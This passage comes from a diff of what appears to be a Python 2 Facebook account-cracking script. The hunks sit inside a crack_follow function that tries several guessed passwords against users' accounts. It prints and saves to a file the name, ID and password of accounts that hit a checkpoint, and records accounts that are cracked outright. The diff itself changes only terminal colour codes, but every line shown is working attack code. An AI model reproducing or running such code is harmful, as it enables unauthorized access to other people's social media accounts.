+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos1
                 cek = open('done/follow.txt', 'a')
                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
@@ -1689,10 +1689,10 @@ def crack_follow():
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
-                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos2
+                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos2
                     cek = open('done/follow.txt', 'a')
                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
@@ -1711,10 +1711,10 @@ def crack_follow():
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
-                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos3
+                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos3
                         cek = open('done/follow.txt', 'a')
                         cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
@@ -1733,10 +1733,10 @@ def crack_follow():
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
-                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos4
+                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos4
                             cek = open('done/follow.txt', 'a')
                             cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
@@ -1755,10 +1755,10 @@ def crack_follow():
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
-                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos5
+                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos5
                                 cek = open('done/follow.txt', 'a')
                                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
@@ -1777,10 +1777,10 @@ def crack_follow():
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
-                                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos6
+                                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos6
                                     cek = open('done/follow.txt', 'a')
                                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
